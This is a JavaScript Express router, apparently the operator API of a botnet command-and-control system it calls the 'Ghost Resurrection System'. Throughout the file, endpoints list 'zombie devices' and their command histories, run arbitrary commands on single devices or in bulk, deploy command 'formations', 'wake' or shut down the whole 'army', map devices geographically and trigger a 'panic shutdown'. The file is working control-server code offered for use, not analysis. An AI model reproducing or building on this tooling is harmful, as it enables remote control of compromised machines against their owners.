/**
 * Advanced Analytics API for Ghost Resurrection System Phase 3
 * 
 * Provides comprehensive API endpoints for the ultimate control dashboard
 * with real-time analytics, security monitoring, and zombie army management.
 */

const express = require('express');
const router = express.Router();

class AdvancedAnalyticsAPI {
    constructor(ghostManager) {
        this.ghostManager = ghostManager;
        this.setupRoutes();
        console.log('📊 Advanced Analytics API initialized for Phase 3');
    }

    setupRoutes() {
        // Phase 3 Dashboard Data Endpoint
        router.get('/dashboard-data', (req, res) => {
            try {
                const dashboardData = this.ghostManager.getPhase3DashboardData();
                res.json({
                    success: true,
                    timestamp: new Date().toISOString(),
                    data: dashboardData
                });
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });

        // Real-time Analytics Endpoint
        router.get('/analytics/realtime', (req, res) => {
            try {
                const analytics = {
                    performanceMetrics: this.ghostManager.performanceMetrics,
                    activeDevices: this.ghostManager.activeSessions.size,
                    totalDevices: this.ghostManager.zombieDevices.size,
                    securityStatus: this.ghostManager.calculateOverallThreatLevel(),
                    lastUpdate: new Date().toISOString()
                };
                
                res.json({ success: true, analytics });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Device Management Endpoints
        router.get('/devices', (req, res) => {
            try {
                const devices = Array.from(this.ghostManager.zombieDevices.values()).map(device => ({
                    ...device,
                    isActive: this.ghostManager.activeSessions.has(device.deviceId),
                    analytics: this.ghostManager.analyticsData.get(device.deviceId),
                    behaviorPattern: this.ghostManager.behaviorPatterns.get(device.deviceId)
                }));

                res.json({ success: true, devices });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.get('/devices/:deviceId/details', (req, res) => {
            try {
                const { deviceId } = req.params;
                const device = this.ghostManager.getZombieByDeviceId(deviceId);
                
                if (!device) {
                    return res.status(404).json({
                        success: false,
                        error: 'Device not found'
                    });
                }

                const session = this.ghostManager.activeSessions.get(deviceId);
                const analytics = this.ghostManager.analyticsData.get(deviceId);
                const behavior = this.ghostManager.behaviorPatterns.get(deviceId);
                const commandHistory = this.ghostManager.commandHistory.get(deviceId) || [];

                res.json({
                    success: true,
                    device: {
                        ...device,
                        session,
                        analytics,
                        behavior,
                        commandHistory: commandHistory.slice(-20), // Last 20 commands
                        systemStats: this.ghostManager.getSystemStats(deviceId),
                        connectionQuality: this.ghostManager.getConnectionQuality(device)
                    }
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Formation Management Endpoints
        router.get('/formations/templates', (req, res) => {
            try {
                const templates = Array.from(this.ghostManager.formationTemplates.values());
                res.json({ success: true, templates });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.post('/formations/deploy', async (req, res) => {
            try {
                const { templateId, customCommands } = req.body;
                
                if (!templateId) {
                    return res.status(400).json({
                        success: false,
                        error: 'Template ID is required'
                    });
                }

                const result = await this.ghostManager.deployFormation(templateId, customCommands);
                res.json({ success: true, deployment: result });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.post('/formations/create', (req, res) => {
            try {
                const { templateId, config } = req.body;
                
                if (!templateId || !config) {
                    return res.status(400).json({
                        success: false,
                        error: 'Template ID and config are required'
                    });
                }

                const formation = this.ghostManager.createFormationTemplate(templateId, config);
                res.json({ success: true, formation });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Command Execution Endpoints
        router.post('/commands/execute', async (req, res) => {
            try {
                const { deviceId, command, priority = 'normal', timeout = 30, parameters = {} } = req.body;
                
                if (!deviceId || !command) {
                    return res.status(400).json({
                        success: false,
                        error: 'Device ID and command are required'
                    });
                }

                const result = await this.ghostManager.executeAdvancedCommand(deviceId, {
                    command,
                    priority,
                    timeout,
                    parameters
                });

                res.json({ success: true, execution: result });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.post('/commands/bulk-execute', async (req, res) => {
            try {
                const { deviceIds, command, priority = 'normal' } = req.body;
                
                if (!deviceIds || !Array.isArray(deviceIds) || !command) {
                    return res.status(400).json({
                        success: false,
                        error: 'Device IDs array and command are required'
                    });
                }

                const results = [];
                for (const deviceId of deviceIds) {
                    try {
                        const result = await this.ghostManager.executeAdvancedCommand(deviceId, {
                            command,
                            priority,
                            timeout: 45
                        });
                        results.push({ deviceId, ...result });
                    } catch (error) {
                        results.push({ 
                            deviceId, 
                            success: false, 
                            error: error.message 
                        });
                    }
                }

                res.json({ 
                    success: true, 
                    totalDevices: deviceIds.length,
                    successful: results.filter(r => r.success).length,
                    results 
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Security Monitoring Endpoints
        router.get('/security/alerts', (req, res) => {
            try {
                const alerts = Array.from(this.ghostManager.securityAlerts.values())
                    .sort((a, b) => b.timestamp - a.timestamp)
                    .slice(0, 100); // Last 100 alerts

                const threatLevel = this.ghostManager.calculateOverallThreatLevel();
                
                res.json({ 
                    success: true, 
                    alerts, 
                    threatLevel,
                    alertCount: alerts.length
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.get('/security/behavior-analysis', (req, res) => {
            try {
                const behaviors = Array.from(this.ghostManager.behaviorPatterns.values());
                const anomalies = this.ghostManager.getRecentAnomalies();
                const riskDistribution = this.ghostManager.getRiskDistribution();

                res.json({
                    success: true,
                    behaviors,
                    anomalies,
                    riskDistribution
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Mass Operations Endpoints
        router.post('/mass-operations/wake-army', async (req, res) => {
            try {
                const { criteria = 'all' } = req.body;
                
                let targetDevices;
                if (criteria === 'all') {
                    targetDevices = Array.from(this.ghostManager.zombieDevices.values());
                } else {
                    targetDevices = this.ghostManager.findDevicesByCriteria(criteria);
                }

                const deviceIds = targetDevices.map(d => d.deviceId);
                const result = await this.ghostManager.wakeUpZombieArmy(deviceIds, 'mass_resurrection');

                res.json({ success: true, massOperation: result });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.post('/mass-operations/shutdown-army', async (req, res) => {
            try {
                const activeDeviceIds = Array.from(this.ghostManager.activeSessions.keys());
                
                const results = [];
                for (const deviceId of activeDeviceIds) {
                    try {
                        await this.ghostManager.endZombieSession(deviceId, 'mass_shutdown');
                        results.push({ deviceId, success: true });
                    } catch (error) {
                        results.push({ 
                            deviceId, 
                            success: false, 
                            error: error.message 
                        });
                    }
                }

                res.json({
                    success: true,
                    totalDevices: activeDeviceIds.length,
                    shutdown: results.filter(r => r.success).length,
                    results
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Geographic Distribution Endpoint
        router.get('/analytics/geographic', (req, res) => {
            try {
                const distribution = this.ghostManager.getGeographicDistribution();
                res.json({ success: true, geographic: distribution });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Performance Metrics Endpoint
        router.get('/analytics/performance', (req, res) => {
            try {
                const metrics = this.ghostManager.performanceMetrics;
                const deviceAnalytics = Array.from(this.ghostManager.analyticsData.values());
                
                res.json({ 
                    success: true, 
                    performance: metrics,
                    deviceMetrics: deviceAnalytics
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // Emergency Operations Endpoint
        router.post('/emergency/panic-shutdown', async (req, res) => {
            try {
                console.log('🚨 EMERGENCY PANIC SHUTDOWN INITIATED');
                
                const activeDeviceIds = Array.from(this.ghostManager.activeSessions.keys());
                const results = [];
                
                // Immediately shutdown all active sessions
                for (const deviceId of activeDeviceIds) {
                    try {
                        await this.ghostManager.endZombieSession(deviceId, 'emergency_panic');
                        results.push({ deviceId, success: true });
                    } catch (error) {
                        results.push({ deviceId, success: false, error: error.message });
                    }
                }

                console.log(`🚨 Panic shutdown complete: ${results.filter(r => r.success).length}/${activeDeviceIds.length} devices`);

                res.json({
                    success: true,
                    emergency: 'panic_shutdown',
                    devicesShutdown: results.filter(r => r.success).length,
                    totalDevices: activeDeviceIds.length,
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });
    }

    getRouter() {
        return router;
    }
}

module.exports = AdvancedAnalyticsAPI;
